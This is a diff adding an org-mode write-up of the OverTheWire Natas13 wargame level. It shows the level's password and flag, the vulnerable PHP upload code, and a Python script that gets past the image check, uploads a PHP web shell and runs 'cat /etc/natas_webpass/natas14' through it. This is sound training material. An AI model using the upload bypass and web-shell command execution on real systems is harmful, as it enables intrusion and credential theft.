@@ -1,0 +1,177 @@
+:PROPERTIES:
+:ID:       d803954c-1f3e-4471-b741-0cb738ec73f8
+:END:
+#+title: Natas13
+* Previous
+[[id:fdd79b13-1484-46a9-a443-bd8432d7da31][Natas12]]
+
+* Password
+jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY
+
+* Flag
+Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1
+
+* Notes
+
+From top page:
+#+begin_src html
+For security reasons, we now only accept image files!
+<form action="index.php" enctype="multipart/form-data" method="POST">
+  <input name="MAX_FILE_SIZE" type="hidden" value="1000"/>
+  <input name="filename" type="hidden" value="rvvrls0juz.jpg"/>
+  Choose a JPEG to upload (max 1KB):
+  <input name="uploadedfile" type="file"/>
+  <input type="submit" value="Upload File"/>
+</form>
+<div id="viewsource">
+  <a href="index-source.html">
+    View sourcecode
+#+end_src
+
+From index-source.html:
+#+begin_src php
+<?
+    function genRandomString() {
+        $length = 10;
+        $characters = "0123456789abcdefghijklmnopqrstuvwxyz";
+        $string = "";
+
+        for ($p = 0; $p < $length; $p++) {
+                $string .= $characters[mt_rand(0, strlen($characters)-1)];
+            }
+
+        return $string;
+    }
+
+function makeRandomPath($dir, $ext) {
+    do {
+            $path = $dir."/".genRandomString().".".$ext;
+        } while(file_exists($path));
+    return $path;
+}
+
+function makeRandomPathFromFilename($dir, $fn) {
+    $ext = pathinfo($fn, PATHINFO_EXTENSION);
+    return makeRandomPath($dir, $ext);
+}
+
+if(array_key_exists("filename", $_POST)) {
+    $target_path = makeRandomPathFromFilename("upload", $_POST["filename"]);
+    $err=$_FILES['uploadedfile']['error'];
+    if($err){
+        if($err === 2){
+            echo "The uploaded file exceeds MAX_FILE_SIZE";
+        } else{
+            echo "Something went wrong :/";
+        }
+    } else if(filesize($_FILES['uploadedfile']['tmp_name']) > 1000) {
+            echo "File is too big";
+        } else if (! exif_imagetype($_FILES['uploadedfile']['tmp_name'])) {
+            echo "File is not an image";
+        } else {
+            if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_path)) {
+                echo "The file <a href=\"$target_path\"> $target_path
+                          has been uploaded";
+            } else {
+                echo "There was an error uploading the file, please try again!";
+            }
+        }
+} else {
+?>;
+    <form enctype="multipart action="index.php" form-data"="" method="POST">
+                 <input type="hidden" name="max_file_size" value="1000" >
+                 </input type="hidden" name="max_file_size" value="1000" >
+                 <input type="hidden" name="filename" value="<? print genrandomstring(); ?>
+        .jpg" /&gt;
+        Choose a JPEG to upload (max 1KB):
+    <input name="uploadedfile" type="file" >
+        </input name="uploadedfile" type="file" >
+        <br >
+        </br >
+
+        <input type="submit" value="upload file" >
+        </input type="submit" value="upload file" >
+
+
+        <? } ?>
+
+            <div id="viewsource">
+    <a href="index-source.html">
+    View sourcecode
+
+
+    </a href="index-source.html">
+    </div id="viewsource">
+    </input type="hidden" name="filename" value="<? print genrandomstring(); ?>
+      </form enctype="multipart>
+    </a href=\"$target_path\">
+    </div id="content">
+    </body>
+
+    </html>
+
+    </span>
+    </code>
+    0123456789abcdefghijklmnopqrstuv
+#+end_src
+
+The server uses the `exif_imagetype` function to verify the type of the file.
+This is done by checking the first few bytes of a file. See [[https://en.wikipedia.org/wiki/List_of_file_signatures][file signatures]].
+The server can be tricked by adding the right signature at the beginning of the file.
+
+#+begin_src python :results output
+#!/usr/bin/env python3
+
+import requests
+import re
+import html
+from bs4 import BeautifulSoup as bs
+from natas_pass import passwords
+
+session = requests.Session()
+username = "natas13"
+password = passwords[username]
+
+url = "http://{}.natas.labs.overthewire.org/".format(username)
+
+# response = session.get(url, auth=(username, password))
+# response = session.get(url + "index-source.html", auth=(username, password))
+
+response = requests.post(
+    url,
+    auth=(username, password),
+    data={"filename":"xxx.php"},
+    files={'uploadedfile': open('revshell2.php', 'rb')}
+)
+
+raw_content = response.text
+sourcecode = html.unescape(raw_content)
+soup = bs(sourcecode, features="html.parser")
+# headers = response.headers
+# print(headers)
+# print(soup.prettify())
+
+script_path = re.findall("(upload/[a-zA-Z0-9]{10}.php)", raw_content)[0]
+
+if script_path :
+    raw_content = requests.get(
+    url+script_path+"?var=cat /etc/natas_webpass/natas14",
+    auth=(username, password)
+).text
+else :
+    print("Error. No path found.")
+
+p = re.findall("([a-zA-Z0-9]{32})", raw_content)
+
+if p and p[0] == password:
+    p.pop(0)
+
+if p :
+    print(p[0])
+#+end_src
+
+#+RESULTS:
+: Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1
+
+* Next
+[[id:97c8b7c2-a841-41a4-ba77-8a5a045b74cb][Natas14]]
